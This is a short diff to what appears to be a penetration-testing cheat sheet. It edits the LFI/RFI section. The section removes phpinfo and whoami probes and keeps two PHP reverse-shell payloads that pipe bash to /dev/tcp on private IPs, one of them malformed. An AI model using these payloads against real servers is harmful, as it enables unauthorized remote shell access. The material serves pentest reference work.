@@ -56,10 +56,9 @@ Using MSF. Start MSF before starting these steps:
 
 LFI / RFI
 ----------------
-- <?php phpinfo()?>
-- <?php echo shell_exec(whoami);?>
-- <?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10/1234 0>&1'");
-- <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
+- _<?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10/1234 0>&1'");
+- _<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
+- Refer to LFI / RFI section at the top of the page ^^
 
 MSSQL / SQLi
 ----------------
